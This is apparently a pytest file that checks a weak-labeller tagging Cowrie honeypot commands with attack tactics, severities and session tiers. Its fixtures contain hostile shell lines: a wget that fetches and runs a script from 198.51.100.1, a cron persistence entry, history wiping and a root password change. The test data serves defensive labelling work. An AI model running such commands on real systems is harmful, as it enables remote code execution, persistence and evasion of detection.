import pytest

from vulnmaze.labels.weak import label_events


@pytest.mark.parametrize(
    "source,client,tiers,lines,expected,session",
    [
        (
            "live",
            "SSH-2.0-OpenSSH_9.6",
            {"s1": "llm_agent"},
            ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m"],
            [("Discovery", "R1")] * 3,
            (["Discovery"], "R1", "llm_agent"),
        ),
        (
            "public:cyberlab",
            None,
            {},
            [
                "cd /tmp; wget http://198.51.100.1/x.sh; chmod +x x.sh; ./x.sh",
                "(crontab -l; echo '* * * * * /tmp/x.sh') | crontab -",
                "history -c",
            ],
            [("Execution", "R3"), ("Persistence", "R4"), ("Defense Evasion", "R3")],
            (["Execution", "Persistence", "Defense Evasion"], "R4", "bot"),
        ),
        (
            "live",
            "SSH-2.0-Go",
            {},
            ["echo 'root:pw' | chpasswd", "pkill -9 xmrig", "rm -rf ~/.bash_history", "kill -9 1234"],
            [("Persistence", "R4"), ("Impact", "R4"), ("Defense Evasion", "R3"), ("Impact", "R3")],
            (["Persistence", "Impact", "Defense Evasion"], "R4", "bot"),
        ),
    ],
)
def test_labels_commands_and_sessions(source, client, tiers, lines, expected, session):
    """Common honeypot command families get the expected tactic and severity, and sessions keep every tactic."""
    events = [{"source": source, "session": "s1", "eventid": "cowrie.client.version", "data": {"version": client}}]
    events += [
        {"source": source, "session": "s1", "eventid": "cowrie.command.input", "ts": i, "input": line}
        for i, line in enumerate(lines)
    ]
    commands, sessions, summary = label_events(events, tiers)
    assert [(c["tactic"], c["severity"]) for c in commands] == expected
    assert (sessions[0]["tactics"], sessions[0]["severity"], sessions[0]["tier"]) == session
    assert summary["coverage"] == 1.0


@pytest.mark.parametrize("line", ["", "   ", "asdfgh qwerty", "\x1b[A\x00", "cat notes.txt", None])
def test_unknown_input_abstains(line):
    """Empty, garbage and unmatched lines are never labelled, and their session stays unlabelled."""
    events = [{"source": "live", "session": "s1", "eventid": "cowrie.command.input", "ts": 0, "input": line}]
    commands, sessions, summary = label_events(events)
    assert all(c["tactic"] is None and c["severity"] is None for c in commands)
    assert (sessions[0]["tactics"], sessions[0]["severity"], sessions[0]["tier"]) == ([], None, None)
    assert summary["labelled"] == 0
